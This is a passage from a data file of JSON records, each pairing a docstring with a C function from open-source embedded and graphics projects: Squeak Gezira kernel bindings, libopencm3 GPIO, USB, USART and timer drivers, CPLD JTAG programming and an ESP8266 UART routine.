{"docstring": "/*\tAutomatically generated (see generatePluginKernels) */\n", "func_signal": "static void kernelPadTexturesize(sqInt*argOops, sqInt argCount)", "code": "{\n\tnile_Process_t*result;\n\tfloat dX;\n\tfloat dY;\n\n\tif (argCount != 2) {\n\t\tfail(\"wrong argument count in PadTexture\"); return;\n\t}\n\tdX = interpreterProxy->floatValueOf(argOops[0]);\n\tdY = interpreterProxy->floatValueOf(argOops[1]);\n\tif (interpreterProxy->failed()) {\n\t\tfail(\"wrong arguments to PadTexture\"); return;\n\t}\n\tresult = gezira_PadTexture(init, dX, dY);\n\t/* begin pushKernel: */\n\tif (!(stackP < ((sizeof(stack)) / (sizeof(stack[0]))))) {\n\t\tfail(\"kernel stack overflow\");\n\t\tgoto l1;\n\t}\n\tstack[stackP] = result;\n\tstackP += 1;\nl1:\t/* end pushKernel: */;\n}", "path": "bindings\\squeak\\GeziraBindingsMT.c", "repo_name": "damelang/gezira", "stars": 159, "license": "mit", "language": "c", "size": 990}
{"docstring": "/*\tStore the result of a previous operation. */\n", "func_signal": "static sqInt makePointand(double x, double y)", "code": "{\n\tsqInt xx;\n\tsqInt yy;\n\tsqInt point;\n\n\tpoint = interpreterProxy->instantiateClassindexableSize(interpreterProxy->classPoint(), 2);\n\tinterpreterProxy->pushRemappableOop(point);\n\txx = interpreterProxy->floatObjectOf(x);\n\tinterpreterProxy->pushRemappableOop(xx);\n\tyy = interpreterProxy->floatObjectOf(y);\n\txx = interpreterProxy->popRemappableOop();\n\tpoint = interpreterProxy->popRemappableOop();\n\tinterpreterProxy->storePointerofObjectwithValue(0, point, xx);\n\tinterpreterProxy->storePointerofObjectwithValue(1, point, yy);\n\treturn point;\n}", "path": "bindings\\squeak\\GeziraBindingsMT.c", "repo_name": "damelang/gezira", "stars": 159, "license": "mit", "language": "c", "size": 990}
{"docstring": "/*\tAutomatically generated (see generatePluginKernels) */\n", "func_signal": "static void kernelCompositeSrcAtopsize(sqInt*argOops, sqInt argCount)", "code": "{\n\tnile_Process_t*result;\n\n\tif (argCount != 0) {\n\t\tfail(\"wrong argument count in CompositeSrcAtop\"); return;\n\t}\n\tresult = gezira_CompositeSrcAtop(init);\n\t/* begin pushKernel: */\n\tif (!(stackP < ((sizeof(stack)) / (sizeof(stack[0]))))) {\n\t\tfail(\"kernel stack overflow\");\n\t\tgoto l1;\n\t}\n\tstack[stackP] = result;\n\tstackP += 1;\nl1:\t/* end pushKernel: */;\n}", "path": "bindings\\squeak\\GeziraBindingsMT.c", "repo_name": "damelang/gezira", "stars": 159, "license": "mit", "language": "c", "size": 990}
{"docstring": "/*\tAutomatically generated (see generatePluginKernels) */\n", "func_signal": "static void kernelCompositeDstAtopsize(sqInt*argOops, sqInt argCount)", "code": "{\n\tnile_Process_t*result;\n\n\tif (argCount != 0) {\n\t\tfail(\"wrong argument count in CompositeDstAtop\"); return;\n\t}\n\tresult = gezira_CompositeDstAtop(init);\n\t/* begin pushKernel: */\n\tif (!(stackP < ((sizeof(stack)) / (sizeof(stack[0]))))) {\n\t\tfail(\"kernel stack overflow\");\n\t\tgoto l1;\n\t}\n\tstack[stackP] = result;\n\tstackP += 1;\nl1:\t/* end pushKernel: */;\n}", "path": "bindings\\squeak\\GeziraBindingsMT.c", "repo_name": "damelang/gezira", "stars": 159, "license": "mit", "language": "c", "size": 990}
{"docstring": "/*\tAutomatically generated (see generatePluginKernels) */\n", "func_signal": "static void kernelCompositeXorsize(sqInt*argOops, sqInt argCount)", "code": "{\n\tnile_Process_t*result;\n\n\tif (argCount != 0) {\n\t\tfail(\"wrong argument count in CompositeXor\"); return;\n\t}\n\tresult = gezira_CompositeXor(init);\n\t/* begin pushKernel: */\n\tif (!(stackP < ((sizeof(stack)) / (sizeof(stack[0]))))) {\n\t\tfail(\"kernel stack overflow\");\n\t\tgoto l1;\n\t}\n\tstack[stackP] = result;\n\tstackP += 1;\nl1:\t/* end pushKernel: */;\n}", "path": "bindings\\squeak\\GeziraBindingsMT.c", "repo_name": "damelang/gezira", "stars": 159, "license": "mit", "language": "c", "size": 990}
{"docstring": "/*\tAutomatically generated (see generatePluginKernels) */\n", "func_signal": "static void kernelCompositeColorDodgesize(sqInt*argOops, sqInt argCount)", "code": "{\n\tnile_Process_t*result;\n\n\tif (argCount != 0) {\n\t\tfail(\"wrong argument count in CompositeColorDodge\"); return;\n\t}\n\tresult = gezira_CompositeColorDodge(init);\n\t/* begin pushKernel: */\n\tif (!(stackP < ((sizeof(stack)) / (sizeof(stack[0]))))) {\n\t\tfail(\"kernel stack overflow\");\n\t\tgoto l1;\n\t}\n\tstack[stackP] = result;\n\tstackP += 1;\nl1:\t/* end pushKernel: */;\n}", "path": "bindings\\squeak\\GeziraBindingsMT.c", "repo_name": "damelang/gezira", "stars": 159, "license": "mit", "language": "c", "size": 990}
{"docstring": "/*\tAutomatically generated (see generatePluginKernels) */\n", "func_signal": "static void kernelCalculateBoundssize(sqInt*argOops, sqInt argCount)", "code": "{\n\tnile_Process_t*result;\n\n\tif (argCount != 0) {\n\t\tfail(\"wrong argument count in CalculateBounds\"); return;\n\t}\n\tresult = gezira_CalculateBounds(init);\n\t/* begin pushKernel: */\n\tif (!(stackP < ((sizeof(stack)) / (sizeof(stack[0]))))) {\n\t\tfail(\"kernel stack overflow\");\n\t\tgoto l1;\n\t}\n\tstack[stackP] = result;\n\tstackP += 1;\nl1:\t/* end pushKernel: */;\n}", "path": "bindings\\squeak\\GeziraBindingsMT.c", "repo_name": "damelang/gezira", "stars": 159, "license": "mit", "language": "c", "size": 990}
{"docstring": "/*\tAutomatically generated (see generatePluginKernels) */\n", "func_signal": "static void kernelTransformBezierssize(sqInt*argOops, sqInt argCount)", "code": "{\n\tfloat mE;\n\tfloat mD;\n\tfloat mC;\n\tfloat mB;\n\tfloat mA;\n\tnile_Process_t*result;\n\tfloat mF;\n\n\tif (argCount != 6) {\n\t\tfail(\"wrong argument count in TransformBeziers\"); return;\n\t}\n\tmA = interpreterProxy->floatValueOf(argOops[0]);\n\tmB = interpreterProxy->floatValueOf(argOops[1]);\n\tmC = interpreterProxy->floatValueOf(argOops[2]);\n\tmD = interpreterProxy->floatValueOf(argOops[3]);\n\tmE = interpreterProxy->floatValueOf(argOops[4]);\n\tmF = interpreterProxy->floatValueOf(argOops[5]);\n\tif (interpreterProxy->failed()) {\n\t\tfail(\"wrong arguments to TransformBeziers\"); return;\n\t}\n\tresult = gezira_TransformBeziers(init, mA, mB, mC, mD, mE, mF);\n\t/* begin pushKernel: */\n\tif (!(stackP < ((sizeof(stack)) / (sizeof(stack[0]))))) {\n\t\tfail(\"kernel stack overflow\");\n\t\tgoto l1;\n\t}\n\tstack[stackP] = result;\n\tstackP += 1;\nl1:\t/* end pushKernel: */;\n}", "path": "bindings\\squeak\\GeziraBindingsMT.c", "repo_name": "damelang/gezira", "stars": 159, "license": "mit", "language": "c", "size": 990}
{"docstring": "/*\tAutomatically generated (see generatePluginKernels) */\n", "func_signal": "static void kernelUniformColorsize(sqInt*argOops, sqInt argCount)", "code": "{\n\tfloat cA;\n\tfloat cR;\n\tfloat cG;\n\tnile_Process_t*result;\n\tfloat cB;\n\n\tif (argCount != 4) {\n\t\tfail(\"wrong argument count in UniformColor\"); return;\n\t}\n\tcA = interpreterProxy->floatValueOf(argOops[0]);\n\tcR = interpreterProxy->floatValueOf(argOops[1]);\n\tcG = interpreterProxy->floatValueOf(argOops[2]);\n\tcB = interpreterProxy->floatValueOf(argOops[3]);\n\tif (interpreterProxy->failed()) {\n\t\tfail(\"wrong arguments to UniformColor\"); return;\n\t}\n\tresult = gezira_UniformColor(init, cA, cR, cG, cB);\n\t/* begin pushKernel: */\n\tif (!(stackP < ((sizeof(stack)) / (sizeof(stack[0]))))) {\n\t\tfail(\"kernel stack overflow\");\n\t\tgoto l1;\n\t}\n\tstack[stackP] = result;\n\tstackP += 1;\nl1:\t/* end pushKernel: */;\n}", "path": "bindings\\squeak\\GeziraBindingsMT.c", "repo_name": "damelang/gezira", "stars": 159, "license": "mit", "language": "c", "size": 990}
{"docstring": "/*\tAutomatically generated (see generatePluginKernels) */\n", "func_signal": "static void kernelRepeatGradientsize(sqInt*argOops, sqInt argCount)", "code": "{\n\tnile_Process_t*result;\n\n\tif (argCount != 0) {\n\t\tfail(\"wrong argument count in RepeatGradient\"); return;\n\t}\n\tresult = gezira_RepeatGradient(init);\n\t/* begin pushKernel: */\n\tif (!(stackP < ((sizeof(stack)) / (sizeof(stack[0]))))) {\n\t\tfail(\"kernel stack overflow\");\n\t\tgoto l1;\n\t}\n\tstack[stackP] = result;\n\tstackP += 1;\nl1:\t/* end pushKernel: */;\n}", "path": "bindings\\squeak\\GeziraBindingsMT.c", "repo_name": "damelang/gezira", "stars": 159, "license": "mit", "language": "c", "size": 990}
{"docstring": "/**\n * \\brief Unlock the commit control of a special function pin\n *\n * Unlocks the commit control of the given pin or group of pins. If a pin is a\n * JTAG/SWD or NMI, the pin may then be reconfigured as a GPIO pin. If the pin\n * is not locked by default, this has no effect.\n *\n * @param[in] gpioport GPIO block register address base @ref gpio_reg_base\n * @param[in] gpios @ref gpio_pin_id. Any combination of pins may be specified\n *\t\t    by OR'ing then together.\n */\n", "func_signal": "void gpio_unlock_commit(uint32_t gpioport, uint8_t gpios)", "code": "{\n\t/* Unlock the GPIO_CR register */\n\tGPIO_LOCK(gpioport) = GPIO_LOCK_UNLOCK_CODE;\n\t/* Enable committing changes */\n\tGPIO_CR(gpioport) |= gpios;\n\t/* Lock the GPIO_CR register */\n\tGPIO_LOCK(gpioport) = ~GPIO_LOCK_UNLOCK_CODE;\n}", "path": "firmware\\libopencm3\\lib\\lm4f\\gpio.c", "repo_name": "Ttl/vna", "stars": 173, "license": "None", "language": "c", "size": 1514}
{"docstring": "/** Initialize the USB device controller hardware of the LM4F. */\n", "func_signal": "static usbd_device *lm4f_usbd_init(void)", "code": "{\n\tint i;\n\n\t/* Start the USB clock */\n\tperiph_clock_enable(RCC_USB0);\n\t/* Enable the USB PLL interrupts - used to assert PLL lock */\n\tSYSCTL_IMC |= (SYSCTL_IMC_USBPLLLIM | SYSCTL_IMC_PLLLIM);\n\trcc_usb_pll_on();\n\n\t/* Make sure we're disconnected. We'll reconnect later */\n\tlm4f_usb_soft_disconnect();\n\n\t/* Software reset USB */\n\tSYSCTL_SRUSB = 1;\n\tfor (i = 0; i < 1000; i++) {\n\t\t__asm__(\"nop\");\n\t}\n\tSYSCTL_SRUSB = 0;\n\n\t/*\n\t * Wait for the PLL to lock before soft connecting\n\t * This will result in a deadlock if the system clock is not setup\n\t * correctly (clock from main oscillator).\n\t */\n\t/* Wait for it */\n\ti = 0;\n\twhile ((SYSCTL_RIS & SYSCTL_RIS_USBPLLLRIS) == 0) {\n\t\ti++;\n\t\tif (i > 0xffff) {\n\t\t\treturn 0;\n\t\t}\n\t}\n\n\t/* Now connect to USB */\n\tlm4f_usb_soft_connect();\n\n\t/* No FIFO allocated yet, but the first 64 bytes are still reserved */\n\tusbd_dev.fifo_mem_top = 64;\n\n\treturn &usbd_dev;\n}", "path": "firmware\\libopencm3\\lib\\lm4f\\usb_lm4f.c", "repo_name": "Ttl/vna", "stars": 173, "license": "None", "language": "c", "size": 1514}
{"docstring": "/* Set M0s in reset mode (only for LPC4370) */\n", "func_signal": "void ipc_halt_m0s(void)", "code": "{\n\tvolatile uint32_t rst_active_status0;\n\n\t/* Check if M0s is reset by reading status */\n\trst_active_status0 = RESET_ACTIVE_STATUS0;\n\n\t/* If the M0s has reset not asserted, halt it... */\n\twhile (rst_active_status0 & RESET_CTRL0_M0_SUB_RST) {\n\t\tRESET_CTRL0 = ((~rst_active_status0) | RESET_CTRL0_M0_SUB_RST);\n\t\trst_active_status0 = RESET_ACTIVE_STATUS0;\n\t}\n}", "path": "firmware\\libopencm3\\lib\\lpc43xx\\ipc.c", "repo_name": "Ttl/vna", "stars": 173, "license": "None", "language": "c", "size": 1514}
{"docstring": "/*---------------------------------------------------------------------------*/\n/** @brief USART Set Stop Bit(s).\n\nThe stop bits are specified as 0.5, 1, 1.5 or 2.\n\n@param[in] usart unsigned 32 bit. USART block register address base @ref\nusart_reg_base\n@param[in] stopbits unsigned 32 bit. Stop bits @ref usart_cr2_stopbits.\n*/\n", "func_signal": "void usart_set_stopbits(uint32_t usart, uint32_t stopbits)", "code": "{\n\tuint32_t reg32;\n\n\treg32 = USART_CR2(usart);\n\treg32 = (reg32 & ~USART_CR2_STOPBITS_MASK) | stopbits;\n\tUSART_CR2(usart) = reg32;\n}", "path": "firmware\\libopencm3\\lib\\stm32\\common\\usart_common_all.c", "repo_name": "Ttl/vna", "stars": 173, "license": "None", "language": "c", "size": 1514}
{"docstring": "/**\n * \\brief Configure output parameters of a group of pins\n *\n * Sets the output configuration and drive strength, of or a set of GPIO pins\n * for a set of GPIO pins in output mode.\n *\n * @param[in] gpioport GPIO block register address base @ref gpio_reg_base\n * @param[in] otype Output driver configuration (@ref gpio_output_type) \\n\n *\t\t    - GPIO_OTYPE_PP -- Configure pin driver as push-pull \\n\n *\t\t    - GPIO_OTYPE_OD -- Configure pin driver as open drain\n * @param[in] drive Pin drive strength (@ref gpio_drive_strength) \\n\n *\t\t    - GPIO_DRIVE_2MA -- 2mA drive \\n\n *\t\t    - GPIO_DRIVE_4MA -- 4mA drive \\n\n *\t\t    - GPIO_DRIVE_8MA -- 8mA drive \\n\n *\t\t    - GPIO_DRIVE_8MA_SLEW_CTL -- 8mA drive with slew rate\n *\t\t\t\t\t\t control\n * @param[in] gpios @ref gpio_pin_id. Any combination of pins may be specified\n *\t\t    by OR'ing then together\n */\n", "func_signal": "void gpio_set_output_config(uint32_t gpioport, enum gpio_output_type otype,\n\t\t\t     enum gpio_drive_strength drive, uint8_t gpios)", "code": "{\n\tif (otype == GPIO_OTYPE_OD) {\n\t\tGPIO_ODR(gpioport) |= gpios;\n\t} else {\n\t\tGPIO_ODR(gpioport) &= ~gpios;\n\t}\n\n\t/*\n\t * Setting a bit in the GPIO_DRxR register clears the corresponding bit\n\t * in the other GPIO_DRyR registers, and vice-versa.\n\t */\n\tswitch (drive) {\n\tcase GPIO_DRIVE_8MA_SLEW_CTL:\n\t\tGPIO_DR8R(gpioport) |= gpios;\n\t\tGPIO_SLR(gpioport) |= gpios;\n\t\tbreak;\n\tcase GPIO_DRIVE_8MA:\n\t\tGPIO_DR8R(gpioport) |= gpios;\n\t\tGPIO_SLR(gpioport) &= ~gpios;\n\t\tbreak;\n\tcase GPIO_DRIVE_4MA:\n\t\tGPIO_DR4R(gpioport) |= gpios;\n\t\tbreak;\n\tcase GPIO_DRIVE_2MA:\t/* Fall through */\n\tdefault:\n\t\tGPIO_DR2R(gpioport) |= gpios;\n\t\tbreak;\n\t}\n}", "path": "firmware\\libopencm3\\lib\\lm4f\\gpio.c", "repo_name": "Ttl/vna", "stars": 173, "license": "None", "language": "c", "size": 1514}
{"docstring": "/*---------------------------------------------------------------------------*/\n/** @brief USART Set Hardware Flow Control.\n\nThe flow control bit can be selected as none, RTS, CTS or RTS+CTS.\n\n@param[in] usart unsigned 32 bit. USART block register address base @ref\nusart_reg_base\n@param[in] flowcontrol unsigned 32 bit. Flowcontrol @ref usart_cr3_flowcontrol.\n*/\n", "func_signal": "void usart_set_flow_control(uint32_t usart, uint32_t flowcontrol)", "code": "{\n\tuint32_t reg32;\n\n\treg32 = USART_CR3(usart);\n\treg32 = (reg32 & ~USART_FLOWCONTROL_MASK) | flowcontrol;\n\tUSART_CR3(usart) = reg32;\n}", "path": "firmware\\libopencm3\\lib\\stm32\\common\\usart_common_all.c", "repo_name": "Ttl/vna", "stars": 173, "license": "None", "language": "c", "size": 1514}
{"docstring": "/*---------------------------------------------------------------------------*/\n/** @brief Enable Power Voltage Detector.\n\nThis provides voltage level threshold detection. The result of detection is\nprovided in the power voltage detector output flag (see @ref pwr_voltage_high)\nor by setting the EXTI16 interrupt (see datasheet for configuration details).\n\n@param[in] pvd_level uint32_t. Taken from @ref pwr_pls.\n*/\n", "func_signal": "void pwr_enable_power_voltage_detect(uint32_t pvd_level)", "code": "{\n\tPWR_CR &= ~PWR_CR_PLS_MASK;\n\tPWR_CR |= (PWR_CR_PVDE | pvd_level);\n}", "path": "firmware\\libopencm3\\lib\\stm32\\common\\pwr_common_all.c", "repo_name": "Ttl/vna", "stars": 173, "license": "None", "language": "c", "size": 1514}
{"docstring": "/*---------------------------------------------------------------------------*/\n/** @brief USART Send Data Word with Blocking\n\nBlocks until the transmit data buffer becomes empty then writes the next data\nword for transmission.\n\n@param[in] usart unsigned 32 bit. USART block register address base @ref\nusart_reg_base\n@param[in] data unsigned 16 bit.\n*/\n", "func_signal": "void usart_send_blocking(uint32_t usart, uint16_t data)", "code": "{\n\tusart_wait_send_ready(usart);\n\tusart_send(usart, data);\n}", "path": "firmware\\libopencm3\\lib\\stm32\\common\\usart_common_all.c", "repo_name": "Ttl/vna", "stars": 173, "license": "None", "language": "c", "size": 1514}
{"docstring": "/* Start M0s (only for LPC4370) */\n", "func_signal": "void ipc_start_m0s(uint32_t cm0s_baseaddr)", "code": "{\n\tvolatile uint32_t rst_active_status0;\n\n\t/* Set M0s memory mapping to point to start of M0 image */\n\tCREG_M0SUBMEMMAP = cm0s_baseaddr;\n\n\t/* Start/run M0s core */\n\n\t/* Release Slave from reset, first read status */\n\trst_active_status0 = RESET_ACTIVE_STATUS0;\n\n\t/* If the M0 is being held in reset, release it */\n\t/* 1 = no reset, 0 = reset */\n\twhile (!(rst_active_status0 & RESET_CTRL0_M0_SUB_RST)) {\n\t\tRESET_CTRL0 = ((~rst_active_status0) & ~RESET_CTRL0_M0_SUB_RST);\n\t\trst_active_status0 = RESET_ACTIVE_STATUS0;\n\t}\n}", "path": "firmware\\libopencm3\\lib\\lpc43xx\\ipc.c", "repo_name": "Ttl/vna", "stars": 173, "license": "None", "language": "c", "size": 1514}
{"docstring": "/**\n * \\brief Configure a group of pins\n *\n * Sets the Pin direction, analog/digital mode, and pull-up configuration of\n * or a set of GPIO pins on a given GPIO port.\n *\n * @param[in] gpioport GPIO block register address base @ref gpio_reg_base\n * @param[in] mode Pin mode (@ref gpio_mode) \\n\n *\t\t   - GPIO_MODE_OUTPUT -- Configure pin as output \\n\n *\t\t   - GPIO_MODE_INPUT -- Configure pin as input \\n\n *\t\t   - GPIO_MODE_ANALOG -- Configure pin as analog function\n * @param[in] pullup Pin pullup/pulldown configuration (@ref gpio_pullup) \\n\n *\t\t     - GPIO_PUPD_NONE -- Do not pull the pin high or low \\n\n *\t\t     - GPIO_PUPD_PULLUP -- Pull the pin high \\n\n *\t\t     - GPIO_PUPD_PULLDOWN -- Pull the pin low\n * @param[in] gpios @ref gpio_pin_id. Any combination of pins may be specified\n *\t\t    by OR'ing then together\n */\n", "func_signal": "void gpio_mode_setup(uint32_t gpioport, enum gpio_mode mode,\n\t\t     enum gpio_pullup pullup, uint8_t gpios)", "code": "{\n\tswitch (mode) {\n\tcase GPIO_MODE_OUTPUT:\n\t\tGPIO_DIR(gpioport) |= gpios;\n\t\tGPIO_DEN(gpioport) |= gpios;\n\t\tGPIO_AMSEL(gpioport) &= ~gpios;\n\t\tbreak;\n\tcase GPIO_MODE_INPUT:\n\t\tGPIO_DIR(gpioport) &= ~gpios;\n\t\tGPIO_DEN(gpioport) |= gpios;\n\t\tGPIO_AMSEL(gpioport) &= ~gpios;\n\t\tbreak;\n\tcase GPIO_MODE_ANALOG:\n\t\tGPIO_DEN(gpioport) &= ~gpios;\n\t\tGPIO_AMSEL(gpioport) |= gpios;\n\t\tbreak;\n\tdefault:\n\t\t/* Don't do anything */\n\t\tbreak;\n\t}\n\n\t/*\n\t * Setting a bit in the GPIO_PDR register clears the corresponding bit\n\t * in the GPIO_PUR register, and vice-versa.\n\t */\n\tswitch (pullup) {\n\tcase GPIO_PUPD_PULLUP:\n\t\tGPIO_PUR(gpioport) |= gpios;\n\t\tbreak;\n\tcase GPIO_PUPD_PULLDOWN:\n\t\tGPIO_PDR(gpioport) |= gpios;\n\t\tbreak;\n\tcase GPIO_PUPD_NONE:\t/* Fall through */\n\tdefault:\n\t\tGPIO_PUR(gpioport) &= ~gpios;\n\t\tGPIO_PDR(gpioport) &= ~gpios;\n\t\tbreak;\n\t}\n}", "path": "firmware\\libopencm3\\lib\\lm4f\\gpio.c", "repo_name": "Ttl/vna", "stars": 173, "license": "None", "language": "c", "size": 1514}
{"docstring": "/* set pins as inputs so we don't interfere with an external JTAG device */\n", "func_signal": "void cpld_jtag_release(void)", "code": "{\n\tscu_pinmux(SCU_PINMUX_CPLD_TDO, SCU_GPIO_NOPULL | SCU_CONF_FUNCTION4);\n\tscu_pinmux(SCU_PINMUX_CPLD_TCK, SCU_GPIO_NOPULL | SCU_CONF_FUNCTION0);\n\tscu_pinmux(SCU_PINMUX_CPLD_TMS, SCU_GPIO_NOPULL | SCU_CONF_FUNCTION0);\n\tscu_pinmux(SCU_PINMUX_CPLD_TDI, SCU_GPIO_NOPULL | SCU_CONF_FUNCTION0);\n\t\n\tGPIO_DIR(PORT_CPLD_TDO) &= ~PIN_CPLD_TDO;\n\tGPIO_DIR(PORT_CPLD_TCK) &= ~PIN_CPLD_TCK;\n\tGPIO_DIR(PORT_CPLD_TMS) &= ~PIN_CPLD_TMS;\n\tGPIO_DIR(PORT_CPLD_TDI) &= ~PIN_CPLD_TDI;\n}", "path": "firmware\\common\\cpld_jtag.c", "repo_name": "Ttl/vna", "stars": 173, "license": "None", "language": "c", "size": 1514}
{"docstring": "/* Set M0 in reset mode */\n", "func_signal": "void ipc_halt_m0(void)", "code": "{\n\tvolatile uint32_t rst_active_status1;\n\n\t/* Check if M0 is reset by reading status */\n\trst_active_status1 = RESET_ACTIVE_STATUS1;\n\n\t/* If the M0 has reset not asserted, halt it... */\n\twhile (rst_active_status1 & RESET_CTRL1_M0APP_RST) {\n\t\tRESET_CTRL1 = ((~rst_active_status1) | RESET_CTRL1_M0APP_RST);\n\t\trst_active_status1 = RESET_ACTIVE_STATUS1;\n\t}\n}", "path": "firmware\\libopencm3\\lib\\lpc43xx\\ipc.c", "repo_name": "Ttl/vna", "stars": 173, "license": "None", "language": "c", "size": 1514}
{"docstring": "/*---------------------------------------------------------------------------*/\n/** @brief Set Input Polarity\n\n@param[in] timer_peripheral Unsigned int32. Timer register address base\n@param[in] ic ::tim_ic_id. Input Capture channel designator.\n@param[in] pol ::tim_ic_pol. Input Capture polarity.\n*/\n", "func_signal": "void timer_ic_set_polarity(uint32_t timer_peripheral, enum tim_ic_id ic,\n\t\t\t   enum tim_ic_pol pol)", "code": "{\n\tif (pol) {\n\t\tTIM_CCER(timer_peripheral) |= (0x2 << (ic * 4));\n\t} else {\n\t\tTIM_CCER(timer_peripheral) &= ~(0x2 << (ic * 4));\n\t}\n}", "path": "firmware\\libopencm3\\lib\\stm32\\f1\\timer.c", "repo_name": "Ttl/vna", "stars": 173, "license": "None", "language": "c", "size": 1514}
{"docstring": "/**\n * \\brief Multiplex group of pins to the given alternate function\n *\n * Mux the pin or group of pins to the given alternate function. Note that a\n * number of pins may be set but only with a single AF number. This is useful\n * when one or more of a peripheral's pins are assigned to the same alternate\n * function.\n *\n * Because AF0 is not used on the LM4F, passing 0 as the alt_func_num parameter\n * will disable the alternate function of the given pins.\n *\n * @param[in] gpioport GPIO block register address base @ref gpio_reg_base\n * @param[in] alt_func_num Pin alternate function number or 0 to disable the\n *\t\t\t   alternate function multiplexing.\n * @param[in] gpios @ref gpio_pin_id. Any combination of pins may be specified\n *\t\t    by OR'ing then together\n */\n", "func_signal": "void gpio_set_af(uint32_t gpioport, uint8_t alt_func_num, uint8_t gpios)", "code": "{\n\tuint32_t pctl32;\n\tuint8_t pin_mask;\n\tint i;\n\n\t/* Did we mean to disable the alternate function? */\n\tif (alt_func_num == 0) {\n\t\tGPIO_AFSEL(gpioport) &= ~gpios;\n\t\treturn;\n\t}\n\n\t/* Enable the alternate function */\n\tGPIO_AFSEL(gpioport) |= gpios;\n\t/* Alternate functions are digital */\n\tGPIO_DEN(gpioport) |= gpios;\n\n\t/* Now take care of the actual multiplexing */\n\tpctl32 = GPIO_PCTL(gpioport);\n\tfor (i = 0; i < 8; i++) {\n\t\tpin_mask = (1 << i);\n\n\t\tif (!(gpios & pin_mask)) {\n\t\t\tcontinue;\n\t\t}\n\n\t\tpctl32 &= ~PCTL_MASK(i);\n\t\tpctl32 |= PCTL_AF(i, (alt_func_num & 0xf));\n\t}\n\n\tGPIO_PCTL(gpioport) = pctl32;\n}", "path": "firmware\\libopencm3\\lib\\lm4f\\gpio.c", "repo_name": "Ttl/vna", "stars": 173, "license": "None", "language": "c", "size": 1514}
{"docstring": "/* this gets called by the XAPP058 code */\n", "func_signal": "unsigned char cpld_jtag_get_next_byte(void)", "code": "{\n        if (xsvf_pos == xsvf_buffer_len) {\n                refill_buffer();\n                xsvf_pos = 0;\n        }\n\n\tunsigned char byte = xsvf_buffer[xsvf_pos];\n        xsvf_pos++;\n\treturn byte;\n}", "path": "firmware\\common\\cpld_jtag.c", "repo_name": "Ttl/vna", "stars": 173, "license": "None", "language": "c", "size": 1514}
{"docstring": "/*---------------------------------------------------------------------------*/\n/** @brief USART Read a Received Data Word with Blocking.\n\nWait until a data word has been received then return the word.\n\n@param[in] usart unsigned 32 bit. USART block register address base @ref\nusart_reg_base\n@returns unsigned 16 bit data word.\n*/\n", "func_signal": "uint16_t usart_recv_blocking(uint32_t usart)", "code": "{\n\tusart_wait_recv_ready(usart);\n\n\treturn usart_recv(usart);\n}", "path": "firmware\\libopencm3\\lib\\stm32\\common\\usart_common_all.c", "repo_name": "Ttl/vna", "stars": 173, "license": "None", "language": "c", "size": 1514}
{"docstring": "/* return 0 if success else return error code see xsvfExecute() */\n", "func_signal": "int cpld_jtag_program(\n        const uint32_t buffer_length,\n        unsigned char* const buffer,\n        refill_buffer_cb refill\n)", "code": "{\n\tint error;\n\tcpld_jtag_setup();\n\txsvf_buffer = buffer;\n\txsvf_buffer_len = buffer_length;\n        refill_buffer = refill;\n\terror = xsvfExecute();\n\tcpld_jtag_release();\n\t\n\treturn error;\n}", "path": "firmware\\common\\cpld_jtag.c", "repo_name": "Ttl/vna", "stars": 173, "license": "None", "language": "c", "size": 1514}
{"docstring": "/*---------------------------------------------------------------------------*/\n/** @brief USART Set Parity.\n\nThe parity bit can be selected as none, even or odd.\n\n@param[in] usart unsigned 32 bit. USART block register address base @ref\nusart_reg_base\n@param[in] parity unsigned 32 bit. Parity @ref usart_cr1_parity.\n*/\n", "func_signal": "void usart_set_parity(uint32_t usart, uint32_t parity)", "code": "{\n\tuint32_t reg32;\n\n\treg32 = USART_CR1(usart);\n\treg32 = (reg32 & ~USART_PARITY_MASK) | parity;\n\tUSART_CR1(usart) = reg32;\n}", "path": "firmware\\libopencm3\\lib\\stm32\\common\\usart_common_all.c", "repo_name": "Ttl/vna", "stars": 173, "license": "None", "language": "c", "size": 1514}
{"docstring": "/*---------------------------------------------------------------------------*/\n/** @brief USART Return Interrupt Source.\n\nReturns true if the specified interrupt flag (IDLE, RXNE, TC, TXE or OE) was\nset and the interrupt was enabled. If the specified flag is not an interrupt\nflag, the function returns false.\n\n@todo  These are the most important interrupts likely to be used. Others\nrelating to LIN break, and error conditions in multibuffer communication, need\nto be added for completeness.\n\n@param[in] usart unsigned 32 bit. USART block register address base @ref\nusart_reg_base\n@param[in] flag Unsigned int32. Status register flag  @ref usart_sr_flags.\n@returns boolean: flag and interrupt enable both set.\n*/\n", "func_signal": "bool usart_get_interrupt_source(uint32_t usart, uint32_t flag)", "code": "{\n\tuint32_t flag_set = (USART_SR(usart) & flag);\n\t/* IDLE, RXNE, TC, TXE interrupts */\n\tif ((flag >= USART_SR_IDLE) && (flag <= USART_SR_TXE)) {\n\t\treturn ((flag_set & USART_CR1(usart)) != 0);\n\t/* Overrun error */\n\t} else if (flag == USART_SR_ORE) {\n\t\treturn flag_set && (USART_CR3(usart) & USART_CR3_CTSIE);\n\t}\n\n\treturn false;\n}", "path": "firmware\\libopencm3\\lib\\stm32\\common\\usart_common_f124.c", "repo_name": "Ttl/vna", "stars": 173, "license": "None", "language": "c", "size": 1514}
{"docstring": "/*---------------------------------------------------------------------------*/\n/** @brief USART Set Rx/Tx Mode.\n\nThe mode can be selected as Rx only, Tx only or Rx+Tx.\n\n@param[in] usart unsigned 32 bit. USART block register address base @ref\nusart_reg_base\n@param[in] mode unsigned 32 bit. Mode @ref usart_cr1_mode.\n*/\n", "func_signal": "void usart_set_mode(uint32_t usart, uint32_t mode)", "code": "{\n\tuint32_t reg32;\n\n\treg32 = USART_CR1(usart);\n\treg32 = (reg32 & ~USART_MODE_MASK) | mode;\n\tUSART_CR1(usart) = reg32;\n}", "path": "firmware\\libopencm3\\lib\\stm32\\common\\usart_common_all.c", "repo_name": "Ttl/vna", "stars": 173, "license": "None", "language": "c", "size": 1514}
{"docstring": "/******************************************************************************\n * FunctionName : uart1_tx_one_char\n * Description  : Internal used function\n *                Use uart1 interface to transfer one char\n * Parameters   : uint8 TxChar - character to tx\n * Returns      : OK\n*******************************************************************************/\n", "func_signal": "STATUS uart_tx_one_char(uint8 uart, uint8 TxChar)", "code": "{\n    while (true){\n        uint32 fifo_cnt = READ_PERI_REG(UART_STATUS(uart)) & (UART_TXFIFO_CNT<<UART_TXFIFO_CNT_S);\n        if ((fifo_cnt >> UART_TXFIFO_CNT_S & UART_TXFIFO_CNT) < 126) {\n            break;\n        }\n    }\n    WRITE_PERI_REG(UART_FIFO(uart) , TxChar);\n    return OK;\n}", "path": "H03-spi_app\\driver\\uart.c", "repo_name": "AngelLiang/ESP8266-Demos", "stars": 215, "license": "mit", "language": 